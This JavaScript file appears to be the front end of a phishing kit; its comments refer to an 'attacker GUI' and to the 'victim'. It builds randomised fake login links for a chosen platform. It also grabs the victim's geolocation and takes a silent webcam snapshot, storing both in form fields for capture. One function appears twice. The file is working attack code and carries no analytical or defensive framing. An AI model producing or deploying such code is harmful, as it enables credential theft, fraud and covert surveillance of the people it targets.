function generateLink() {
  const platform = document.getElementById("platform").value;
  const attackerId = Math.random().toString(36).substring(2, 15); // Random ID
  const link = `${window.location.origin}/${platform}-login/${attackerId}`;
  document.getElementById("link-output").innerHTML =
    `Send this link: <a href="${link}">${link}</a>`;
}

// Generate phishing link (for attacker GUI)
function generateLink() {
  const platform = document.getElementById("platform").value;
  const attackerId = Math.random().toString(36).substring(2, 15);
  const link = `${window.location.origin}/${platform}-login/${attackerId}`;
  document.getElementById("link-output").innerHTML =
    `Send this link: <a href="${link}">${link}</a>`;
}

// Get victim's location
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        document.getElementById("latitude").value = position.coords.latitude;
        document.getElementById("longitude").value = position.coords.longitude;
      },
      (error) => {
        console.log("Location access denied");
      }
    );
  }
}

// Get camera access and take snapshot
function getCameraAccess() {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const snapshotInput = document.getElementById("snapshot");

  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices
      .getUserMedia({ video: true })
      .then((stream) => {
        video.srcObject = stream;
        // Wait a moment for video to load, then capture snapshot
        setTimeout(() => {
          const context = canvas.getContext("2d");
          context.drawImage(video, 0, 0, 320, 240);
          const dataUrl = canvas.toDataURL("image/png");
          snapshotInput.value = dataUrl;
          // Stop the video stream
          stream.getTracks().forEach((track) => track.stop());
        }, 1000);
      })
      .catch((err) => {
        console.log("Camera access denied");
      });
  }
}
